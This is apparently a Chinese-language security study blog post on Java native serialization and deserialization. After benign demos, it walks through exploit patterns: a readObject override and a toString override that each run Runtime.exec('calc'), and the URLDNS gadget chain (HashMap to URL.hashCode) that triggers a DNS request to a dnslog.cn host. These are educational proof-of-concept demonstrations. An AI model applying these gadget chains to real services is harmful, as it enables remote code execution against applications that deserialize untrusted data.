---
title: JavaEE应用&原生反序列化&重写方法&链条分析&触发类&类加载
published: 2025-10-22
description: JavaEE原生序列化和反序列化的实践案例以及利用链导致的安全问题。
tags: [JavaEE,安全开发]
category: 网络安全
draft: false
---

# JavaEE应用&原生反序列化&重写方法&链条分析&触发类&类加载

## Java—原生使用—序列化&反序列化

序列化：将内存中的对象压缩成字节流。

反序列化：将字节流转换成内存中的对象。

打包->封装->文件（序列化）

文件->解包(反序列化)

### 常规的序列化和反序列化协议

- JAVA内置的writeObject()/readObject()
- JAVA内置的XMLDecoder()/XMLEncoder
- XStream
- SnakeYaml
- FastJson
- Jackson

### 案例演示

UserDemo：

```java
package org.example.seriatestdemo;

import java.io.Serializable;

public class UserDemo implements Serializable {
    public String name = "111";
    public int age = 22;
    public String gender = "male";

    public UserDemo(String name, int age) {
        this.name = name;
        this.age = age;

    }

    // toString 方法，用于打印对象信息
    public String toString() {
        // 返回对象信息的字符串表示
        return "User{" +
                "name='" + name + '\'' +
                ", gender='" + gender + '\'' +
                ", age=" + age +
                '}';
    }

}
```

SerializableDemo序列化：

```java
package org.example.seriatestdemo;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class SerializableDemo {
    public static void main(String[] args) throws IOException {
        // 创建一个用户对象，引用UserDemo
        UserDemo u = new UserDemo("222",114);
        // SerializeTest(obj)
        SerializeTest(u);
        // ser.txt 就是对象u序列化的字节流数据
    }

    public static void SerializeTest(Object obj) throws IOException {
        // FileOutputStream()输出文件
        // 使用ObjectOutputStream 将对象 obj 序列化后输出到文件 ser.txt
        // 将对象obj序列化输出到文件ser.txt
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.txt"));
        oos.writeObject(obj);
    }
}
```

图中为序列化后的字节流数据：

![image-20251022093415781](C:\Users\A411\AppData\Roaming\Typora\typora-user-images\image-20251022093415781.png)

UnSerializableDemo反序列化：

```java
package org.example.seriatestdemo;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class UnSerializableDemo {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        //调用下面的方法 传输ser.txt 解析还原反序列化
        Object obj = UnSerializableTest("ser.txt");

        //对obj对象进行输出 默认调用原始对象的toString方法
        System.out.println(obj);
    }

    public static Object UnSerializableTest(String Filename) throws IOException, ClassNotFoundException {
        // 读取Filename文件进行反序列化还原
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object o = ois.readObject();
        return o;
    }
}
```

进行反序列化后的结果：

![image-20251022100640164](C:\Users\A411\AppData\Roaming\Typora\typora-user-images\image-20251022100640164.png)

### 安全问题

**反序列化利用链**

1. 入口类的 readObject 直接调用危险方法。
2. 入口参数中包含可控类，该类有危险方法， readObject 时调用。
3. 入口类参数中包含可控类，该类又调用其他有危险方法的类， readObject 时调用。
4. 构造函数 / 静态代码块等类加载时隐式执行。

#### 入口类的 readObject 直接调用

在UserDemo中写入readObject方法：

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    //指向正确readObject
    ois.defaultReadObject();
    Runtime.getRuntime().exec("calc");
}
```

经过序列化输出为ser.txt，之后在执行反序列化操作时，因为反序列化这时调用的不是Java本身的方法，而是UserDemo对readObject()进行了重写之后的方法，所以就会执行到远程执行计算器的代码。

#### 入口参数中包含可控类

正常代码中 创建对象HashMap，会用到原生态readObject方法去反序列化数据，

readObject 源方法就在ObjectInputSteam，但是HashMap也有readObject方法，

反序列化readObject方法调用 HashMap里面的readObject。

UrlDns代码如下：

```java
package org.example.seriatestdemo;

import java.io.*;
import java.net.URL;
import java.util.HashMap;

public class UrlDns {
//    执行链：
//		序列化对象hash 来源于自带类HashMap
//         *   Gadget Chain:
//                *   HashMap.readObject()
//                *       HashMap.putVal()
//                *         HashMap.hash()
//                *           URL.hashCode()
//							hashCode执行结果触发访问DNS请求，如果这里是执行命令的话，就是RCE漏洞。
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        HashMap<URL, Integer> map = new HashMap<>();
        // 这里使用的是dnslog中的地址，因为最终结果URL.hashcode()就是dns的访问
        URL url = new URL("http://6asagu.dnslog.cn");
        map.put(url,1);
        SerializeTest(map);
        UnSerializableTest("Dnslog.txt");
    }

    public static void SerializeTest(Object obj) throws IOException {
        // FileOutputStream()输出文件
        // 使用ObjectOutputStream 将对象 obj 序列化后输出到文件 ser.txt
        // 将对象obj序列化输出到文件ser.txt
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("Dnslog.txt"));
        oos.writeObject(obj);
    }

    public static Object UnSerializableTest(String Filename) throws IOException, ClassNotFoundException {
        // 读取Filename文件进行反序列化还原
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object o = ois.readObject();
        return o;
    }
}
```

#### 入口类参数中包含可控类

待补充...

#### 构造函数或静态代码块等类加载时隐式执行

UnserializableDemo：

```java
public class UnserializableDemo {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        //调用下面的方法 传输ser.txt 解析还原反序列化
        Object obj =UnserializableTest("ser.txt");
 
        //对obj对象进行输出 默认调用原始对象的toString方法
        System.out.println(obj);
    }
```

 UserDemo：

```java
@Override
    public String toString() {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
 
        return "UserDemo{" +
                "name='" + name + '\'' +
                ", gender='" + gender + '\'' +
                ", age=" + age +
                '}';
    }
```

因为有toString()进行string方法的改变，在unserializableDemo中System.out.println(obj);//对obj对象进行输出 默认调用原始对象的toString方法